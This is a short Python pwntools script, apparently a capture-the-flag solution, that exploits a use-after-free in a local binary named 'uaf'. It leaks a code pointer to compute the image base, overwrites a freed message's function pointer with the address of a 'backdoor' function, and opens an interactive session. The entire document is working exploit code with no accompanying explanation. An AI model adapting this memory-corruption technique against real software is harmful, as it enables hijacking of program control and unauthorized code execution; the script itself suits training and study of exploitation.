#!/usr/bin/env python3     
from pwn import *          
epath = "./uaf"            
lpath = "/lib/x86_64-linux-gnu/libc-2.23.so"
e = ELF(epath)             
l = ELF(lpath)             
r = process(epath)         
                           
def putmsg(sz, msg):       
    r.recvuntil("message: ")
    r.sendline(str(sz))    
    r.recvuntil("Message: ")
    r.send(msg)                                                                                                                                                               
    r.recvuntil("message: ")
                           
putmsg(0x10, b"A"*8)       
r.recvuntil(b"AAAAAAAA")   
e.address = u64(r.recv(6).ljust(8, b"\x00")) - e.sym.bye_func
success("Image base %s" % hex(e.address))
putmsg(0x10, b"A"*8 + p64(e.sym.backdoor))
putmsg(0x20, b"A")         
                           
r.interactive()            
r.close()
